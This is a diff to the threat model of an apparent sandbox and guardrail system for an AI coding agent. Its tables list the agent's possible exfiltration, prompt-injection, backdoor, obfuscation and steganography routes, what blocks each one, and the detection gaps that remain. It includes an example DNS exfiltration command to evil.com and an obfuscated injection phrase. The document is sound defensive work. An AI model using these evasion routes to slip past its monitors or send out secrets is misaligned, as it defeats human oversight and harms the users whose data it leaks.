@@ -12,13 +12,16 @@ enclAIve assumes compromise will happen and layers defenses so that no single by
 +-  Layer 1: microVM Isolation -----------------------------------------------+
 |  Own kernel, own Docker daemon, workspace-only sync to host.                |
 +- Layer 2: Network Deny-by-Default -----------------------------------------+
-|  HTTP/HTTPS proxy, allowlisted domains only, raw TCP/UDP blocked.           |
+|  Internal Docker network + Squid egress proxy with domain allowlist.        |
+|  All outbound traffic routed through proxy; raw TCP/UDP blocked.            |
 +- Layer 3: Credential Proxy ------------------------------------------------+
 |  API keys injected at proxy layer, never enter the VM.                      |
 |  MCP Gateway (docker mcp secret set) for other credentials.                 |
 +- Layer 4: Write Guard -----------------------------------------------------+
 |  PreToolUse blocks writes to host-executable paths: .git/hooks,             |
-|  .claude/settings.json, .mcp.json, .github/workflows, Makefile, etc.       |
+|  .claude/settings.json, .mcp.json. Tier 2: .env, Makefile, Justfile,       |
+|  .github/workflows/, .gitlab-ci.yml, .circleci/, Jenkinsfile,              |
+|  .profile, .bashrc, .zshrc, .npmrc, .husky/.                               |
 +- Layer 5: Guardrails Sidecar (tamper-resistant) ----------------------------+
 |  Separate container, read-only filesystem, non-root user.                   |
 |  Hub: SecretsPresent (30+ detectors), GuardrailsPII (ML-based)              |
@@ -59,13 +62,13 @@ The agent sends source code, secrets, or other sensitive data to an external end
 
 | Attack Vector | Mitigations | Residual Risk |
 |---------------|-------------|---------------|
-| curl/wget POST with file or data | L5: exfil-guard (24 exfil patterns), L2: network deny blocks unknown hosts | Allowlisted hosts (github.com) can receive data |
+| curl/wget POST with file or data | L5: exfil-guard (curl POST, curl command substitution in URL, curl variable in header, + other patterns), L2: network deny blocks unknown hosts | Allowlisted hosts (github.com) can receive data |
 | netcat/socat reverse shell | L5: exfil-guard (nc/socat patterns), L2: raw TCP blocked | None if network deny is configured |
-| git push to attacker remote | L5: exfil-guard (git remote add, git push non-origin), L2: network deny | Push to github.com with encoded data in commit messages |
+| git push to attacker remote | L5: exfil-guard (git remote add, git push non-origin, git commit --no-verify), L2: network deny | Push to github.com with encoded data in commit messages |
 | Python/Node/Ruby/Perl one-liners | L5: exfil-guard (language-specific network patterns) | Obfuscated imports or unusual libraries |
 | DNS exfiltration (dig/nslookup with data in subdomain) | L5: exfil-guard (DNS patterns) | Shell command substitution can break regex match |
 | /dev/tcp bash built-in | L5: exfil-guard (/dev/tcp pattern), L2: raw TCP blocked | None if network deny is configured |
-| Clipboard utilities (pbcopy, xclip) | None | **Known gap.** No detection for clipboard exfil |
+| Clipboard utilities (pbcopy, xclip, xsel, wl-copy) | L5: exfil-guard (clipboard utility patterns) | None |
 
 ### A3: Prompt Injection
 
@@ -80,8 +83,8 @@ Malicious instructions injected into content the agent reads (fetched pages, fil
 | Synonym substitution ("discard preceding directives") | None (regex requires exact keywords) | **Known gap.** Haiku classifier (opt-in) partially mitigates |
 | L33tspeak/typo evasion ("1gnore") | None | **Known gap.** Requires fuzzy matching |
 | Non-English injection (Spanish, French, etc.) | None (patterns are English only) | **Known gap.** Haiku classifier works across languages |
-| Homoglyph attack (Cyrillic lookalikes) | L5: ForeignScriptDetector flags foreign chars, but doesn't normalize | **Known gap.** Word still passes injection regex |
-| Word Joiner insertion (U+2060 between letters) | Partial: HIDDEN_UNICODE catches U+200B/C/D/FEFF/202x but not U+2060 | **Known gap.** Expand HIDDEN_UNICODE set |
+| Homoglyph attack (Cyrillic lookalikes) | L5: ForeignScriptDetector flags foreign chars, NFKC normalization applied before pattern matching (catches fullwidth Latin bypasses) | True cross-script homoglyphs (e.g., Cyrillic 'i') still evade regex |
+| Word Joiner insertion (U+2060 between letters) | L5: HIDDEN_UNICODE expanded to include U+2060-U+2064 and U+180E | None for covered codepoints |
 | Multi-turn "boiling frog" (gradual context shift) | None (stateless per-message checks) | **Known gap.** Requires cross-turn state tracking |
 | Instruction splitting across variables | None (single-line regex) | **Known gap.** Requires multi-line semantic analysis |
 
@@ -95,7 +98,10 @@ The agent writes backdoors to files that execute outside the sandbox (git hooks,
 | Modify .claude/settings.json | L4: write-guard blocks, L1: entrypoint locks as root-owned | None |
 | Modify .mcp.json | L4: write-guard blocks, L1: entrypoint locks as root-owned | None |
 | Write .github/workflows/ | L4: write-guard blocks | Agent could create workflows via GitHub API if github.com is allowlisted |
-| Modify Makefile, .npmrc, .husky/ | L4: write-guard blocks | None for guarded paths |
+| Modify Makefile, Justfile, .npmrc, .husky/ | L4: write-guard Tier 2 blocks | None for guarded paths |
+| Modify .env | L4: write-guard Tier 2 blocks | None for guarded paths |
+| Modify CI/CD configs (.gitlab-ci.yml, .circleci/, Jenkinsfile) | L4: write-guard Tier 2 blocks | Agent could create CI configs via API if host is allowlisted |
+| Modify shell profiles (.profile, .bashrc, .zshrc) | L4: write-guard Tier 2 blocks | None for guarded paths |
 | Create new executable in unguarded path | L1: microVM contains blast radius (file only exists in sandbox) | File syncs to host workspace mount |
 
 ### A5: Encoding & Obfuscation
@@ -104,13 +110,13 @@ The agent obfuscates payloads to evade pattern matching.
 
 | Attack Vector | Mitigations | Residual Risk |
 |---------------|-------------|---------------|
-| Base64-encoded credential or payload | L5: EncodingDetector (base64 blob detection + decode + re-scan) | Multi-stage encoding (base64 of hex of rot13) |
+| Base64-encoded credential or payload | L5: EncodingDetector (base64 blob detection + decode + re-scan, entropy threshold at 40-char lines) | Multi-stage encoding (base64 of hex of rot13) |
 | Hex-escaped bytes (\xHH sequences) | L5: EncodingDetector (hex pattern) | Short sequences below threshold |
 | URL encoding (%HH sequences) | L5: EncodingDetector (URL encoding pattern) | Short sequences below threshold |
 | JSFuck ([]()!+ only) | L5: EncodingDetector (JSFuck pattern) | None for standard JSFuck |
 | Braille Unicode encoding | L5: EncodingDetector (Braille block detection) | None |
 | Binary encoding (strings of 0/1) | L5: EncodingDetector (32+ consecutive binary digits) | Short sequences below threshold |
-| Foreign script mixing (Cyrillic in Bash) | L5: ForeignScriptDetector (flags 3+ foreign chars in code context) | Low counts below threshold |
+| Foreign script mixing (Cyrillic in Bash) | L5: ForeignScriptDetector (flags 3+ foreign chars in code context, configurable via `ENCLAIVE_ALLOWED_SCRIPTS` env var) | Low counts below threshold |
 | Encoding + network command (escalation) | L5: EncodingDetector escalates to P0 when encoding is detected alongside curl/wget/nc | Encoding without network command is P1 (warn only) |
 
 ### A6: Steganography
@@ -119,7 +125,7 @@ The agent hides data in seemingly benign content.
 
 | Attack Vector | Mitigations | Residual Risk |
 |---------------|-------------|---------------|
-| Zero-width Unicode characters (U+200B, U+200C, etc.) | L5: HIDDEN_UNICODE detection (6 character classes) | U+2060 Word Joiner not in set |
+| Zero-width Unicode characters (U+200B, U+200C, etc.) | L5: HIDDEN_UNICODE detection (expanded set including U+2060-U+2064, U+180E) | None for covered codepoints |
 | Acrostic encoding (first letters spell credential) | L5: AcrosticDetector matches against credential patterns + hex + keywords | Acrostics using uncommon patterns not in the match list |
 | Variable name encoding (data in identifiers) | None | **Known gap.** Fundamentally undetectable by pattern analysis |
 | Synonym selection (choosing words to encode bits) | None | **Known gap.** Fundamentally undetectable by pattern analysis |
@@ -166,7 +172,7 @@ The agent attempts to break out of the microVM boundary.
 
 **Outbound (Claude acting on the world):**
 - PreToolUse: write-guard.sh (host-executable paths)
-- PreToolUse: memory-guard.sh -> sidecar `memory_guard` (AI instruction files)
+- PreToolUse: memory-guard.sh -> sidecar `memory_guard` (AI instruction files, filtered by file path to reduce false positives and latency)
 - PreToolUse: exfil-guard.sh -> sidecar `exfil_guard` (Bash commands)
 - PreToolUse: secret-guard.sh -> sidecar `write_guard` (code writes)
 
@@ -177,7 +183,8 @@ The sidecar architecture means the agent cannot disable its own guards:
 - Sidecar has `read_only: true` filesystem — agent can't modify validators
 - Sidecar runs as non-root user `guardrails`
 - Hook scripts are fail-closed: unexpected sidecar responses block the action
-- `GUARDRAILS_REQUIRE_SIDECAR=1` disables inline fallback entirely
+- `GUARDRAILS_REQUIRE_SIDECAR` defaults to `1` (fail-closed by default), disabling inline fallback entirely
+- Audit logs written to `/var/log/enclaive/` (a separate Docker volume), not the workspace — agent cannot delete or tamper with them
 
 The microVM sandbox is the hard security boundary. Everything else is defense-in-depth.
 
@@ -191,14 +198,12 @@ The following attacks are documented as known gaps with `xfail` tests in [tests/
 | Instruction splitting | Injection spread across string concat | Single-line regex | Multi-line semantic analysis |
 | L33tspeak | "1gnore all prev1ous" | Character substitution | Fuzzy matching or normalization |
 | Non-English injection | Spanish/French/etc. injection | English-only patterns | Multi-language patterns or Haiku |
-| Clipboard exfil | pbcopy, xclip, xsel | Not in EXFIL_PATTERNS | Add clipboard utility patterns |
 | DNS exfil with shell expansion | `dig $(cat secret \| base64).evil.com` | Shell substitution breaks regex | Improve regex for command substitution |
 | Multi-turn manipulation | Gradual context shift across messages | Stateless per-message checks | Cross-turn state tracking |
-| Homoglyph attack | Cyrillic "i" instead of Latin "i" | Different Unicode codepoints | Unicode normalization layer |
-| Word Joiner | U+2060 between letters | Not in HIDDEN_UNICODE set | Expand Unicode character set |
+| Homoglyph attack | Cyrillic "i" instead of Latin "i" | True cross-script homoglyphs evade NFKC normalization | Cross-script homoglyph table |
 | Educational framing | Credential as "negative example" | Cannot distinguish intent | Semantic classifier |
 
-Each gap has a corresponding xfail test that will start passing when the mitigation is implemented.
+There are 8 xfail tests, each corresponding to a gap that will start passing when the mitigation is implemented.
 
 ## False Positive Prevention
 
